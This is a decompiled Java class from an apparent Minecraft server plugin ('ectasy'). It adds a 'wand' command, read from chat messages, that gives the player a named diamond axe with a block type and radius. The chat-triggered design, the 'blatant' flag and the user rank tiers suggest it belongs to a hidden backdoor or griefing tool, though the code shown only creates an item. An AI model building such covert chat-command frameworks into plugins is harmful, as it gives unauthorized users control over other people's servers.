package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import java.util.ArrayList;
import org.bukkit.Material;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

@CommandInfo(
   name = "wand",
   description = "Gives you a wand.",
   blatant = true,
   rank = Rank.FREE
)
public class WandCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length != 2) {
         ChatUtil.sendChat(var1.getPlayer(), "Please, use wand <block> <radius>");
      } else {
         Material var4;
         try {
            var4 = Material.valueOf(var3[0].toUpperCase());
         } catch (IllegalArgumentException var10) {
            ChatUtil.sendChat(var1.getPlayer(), "The block §f" + var3[0] + "§f wasn't found.");
            return;
         }

         int var5;
         try {
            var5 = Integer.parseInt(var3[1]);
         } catch (NumberFormatException var9) {
            ChatUtil.sendChat(var1.getPlayer(), "Invalid integer (Max : 32727)");
            return;
         }

         ItemStack var6 = new ItemStack(Material.DIAMOND_AXE, 1);
         ItemMeta var7 = var6.getItemMeta();
         var7.setDisplayName("§6wand: §c" + var4);
         ArrayList<String> var8 = new ArrayList<>();
         var8.add("§fRadius: §c" + var5);
         var7.setLore(var8);
         var6.setItemMeta(var7);
         var1.getPlayer().getInventory().addItem(var6);
         ChatUtil.sendChat(var1.getPlayer(), "You received a §cwand.");
      }
   }
}
